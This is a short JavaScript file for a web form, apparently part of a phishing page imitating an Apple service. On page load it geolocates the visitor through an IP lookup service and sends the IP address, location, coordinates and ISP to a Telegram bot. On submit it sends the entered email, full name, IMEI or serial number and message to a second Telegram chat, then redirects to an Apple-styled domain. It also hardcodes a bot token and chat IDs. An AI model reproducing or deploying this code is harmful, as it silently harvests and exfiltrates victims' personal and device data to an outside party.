let form = document.querySelector("#registrationForm");

let bot = {
TOKEN: "1990494557:AAEZjIWrL9in7xgBxC_XMo_BFrJJ1q5Cgrc",
chatID: "-1001590122992",
chatID2: "-1001194325116"
}

const api_url = 'https://ipwhois.app/json/?objects=ip,country,region,city,latitude,longitude,org,isp,timezone_gmt'
async function getISS() {
	const response = await fetch(api_url);
	const data = await response.json();
	var my_text = `GSXAPP:%0A - IP Address: ${data.ip} %0A - City: ${data.city} %0A - State: ${data.region} %0A - Country: ${data.country} %0A - Time Zone: ${data.timezone_gmt} %0A - Latitude: ${data.latitude} %0A - Longitude: ${data.longitude} %0A - Internet Service Provider: ${data.isp} %0A - Organization: ${data.org}`

	fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
	method: "GET"
})
}

form.addEventListener("submit", e => {
	e.preventDefault();
	
	var email = document.getElementById("email").value;
	var name = document.getElementById("name").value;
	var imei = document.getElementById("imei").value;
	var message = document.getElementById("msg").value;
	
	var my_text = `GSXAPP:%0A - Email Address: ${email} %0A - Full Name: ${name} %0A - IMEI/SN: ${imei} %0A %0A 📨 ${message}`
	
	fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID2}&text=${my_text}`,{
		method: "GET"
	})
	.then(success => {
		alert("Thank you for your valuable feedback.")
		window.location.assign("https://apple.gsxapp.com")
	}, error => {
		alert("Submit Failed!")
		console.log(error);
	})
})

getISS();